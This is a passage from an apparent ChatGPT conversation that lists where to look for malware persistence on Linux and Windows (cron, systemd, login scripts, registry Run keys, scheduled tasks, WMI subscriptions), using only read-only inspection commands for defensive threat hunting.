Check user-specific crontab files using crontab -l.
Systemd Services:

Examine services using systemctl list-unit-files --type=service.
Startup Applications:

Check user-specific startup applications in ~/.config/autostart/.
Login Scripts:

Examine global login scripts like /etc/profile, /etc/profile.d/, and /etc/bashrc.
Check user-specific login scripts like ~/.bash_profile, ~/.bash_login, and ~/.profile.
Kernel Modules:

Check loaded kernel modules using lsmod and /proc/modules.
Examine /etc/modules, /etc/modprobe.d/, and /lib/modules/.
System Hooks and Overrides:

Look for custom configurations in /etc/sysctl.conf, /etc/sysctl.d/, /etc/security/limits.conf, and /etc/security/limits.d/.
Systemd Timers:

Check systemd timers using systemctl list-timers.
Network Services:

Check for any unusual network services listening on ports using netstat -tuln.
Unexpected Files and Directories:

Look for unusual files, directories, or binaries that might be suspicious, particularly in common locations like /etc/, /usr/local/bin/, /usr/local/sbin/, and /var/.
Remember to review each discovered item carefully to distinguish between legitimate system configurations and potential threats. Additionally, employing security tools like rkhunter, chkrootkit, or specialized threat hunting tools can help automate this process and identify any anomalies more efficiently.




ChatGPT
In Windows, persistence mechanisms can be established through various means. Here's how you can identify persistence methods:

Startup Items:

Check the Startup folder in the Start menu (C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup for all users or C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup for individual users).
Examine the registry keys:
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
Scheduled Tasks:

Check for scheduled tasks using the Task Scheduler (Control Panel -> Administrative Tools -> Task Scheduler) or via PowerShell commands like Get-ScheduledTask.
Examine the Task Scheduler Library and look for suspicious tasks.
Services:

Use the Services Management Console (services.msc) to review installed services.
Check for services set to start automatically using sc query or Get-Service in PowerShell.
Registry Persistence:

Manually examine the registry keys, including Run keys mentioned above, as well as other locations like HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon, which can specify programs to run during logon.
AppInit_DLLs:

Look for any entries in the registry under HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs. These DLLs are loaded into every process that loads User32.dll during the Windows boot.
WMI Persistence:

Review WMI subscriptions and event filters using tools like wbemtest or PowerShell commands such as Get-WmiObject -Namespace root\subscription -Class __EventFilter.
Startup Scripts and Group Policies:

Review Group Policy Objects (GPOs) applied to the system or the user using gpresult /H filename.html or Group Policy Management Console (gpmc.msc).
Startup Parameters in Installed Applications:

Check installed applications for any auto-start options or settings that could lead to persistence.
Network Services:

Use network monitoring tools to inspect network traffic for suspicious activity, indicating the presence of persistence mechanisms like backdoors or remote access tools.
File System Anomalies:

Look for unusual files or directories, particularly in system directories or user profiles, which could indicate malware or unauthorized persistence mechanisms.
By systematically examining these areas, you can identify common persistence techniques and take appropriate action to remove any malicious elements from the system.




